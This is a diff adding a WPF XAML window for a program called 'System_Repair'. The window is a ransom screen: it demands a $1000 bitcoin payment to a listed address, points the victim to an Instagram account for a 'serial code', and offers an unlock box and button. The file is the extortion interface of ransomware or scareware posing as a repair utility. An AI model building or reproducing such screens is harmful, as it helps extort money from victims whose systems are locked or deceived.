@@ -1,0 +1,18 @@
+﻿<Window x:Class="System_Repair.MainWindow"
+        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
+        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
+        xmlns:local="clr-namespace:System_Repair"
+        mc:Ignorable="d"
+        Title="MainWindow" Height="450" Width="800">
+    <Grid>
+        <TextBox x:Name="serial_code" HorizontalAlignment="Left" Margin="96,357,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="263" Height="67" TextChanged="TextBox_TextChanged"/>
+        <TextBox HorizontalAlignment="Left" Margin="93,80,0,0" TextWrapping="Wrap" Text="System has been repaired make $1000 payment via bitcoin address" VerticalAlignment="Top" Width="541" Height="90" FontSize="30"/>
+        <Label Content="Serial Code" HorizontalAlignment="Left" Margin="93,326,0,0" VerticalAlignment="Top" Width="242"/>
+        <TextBox HorizontalAlignment="Left" Margin="93,0,0,0" TextWrapping="Wrap" VerticalAlignment="Center" Width="541" Height="42" Text="3EUZVto9Mx6KBcRcd1jwJuF1AyxdXV78hB" FontSize="20"/>
+        <Button Content="Unlock" HorizontalAlignment="Left" Margin="364,361,0,0" VerticalAlignment="Top" Height="50" Width="132" Click="Button_Click"/>
+        <TextBox HorizontalAlignment="Left" Margin="93,257,0,0" TextWrapping="Wrap" Text="Retrieve Serial Code after payment from @System_Repair_97 on Instagram" VerticalAlignment="Top" Width="541" Height="50" FontSize="17"/>
+
+    </Grid>
+</Window>
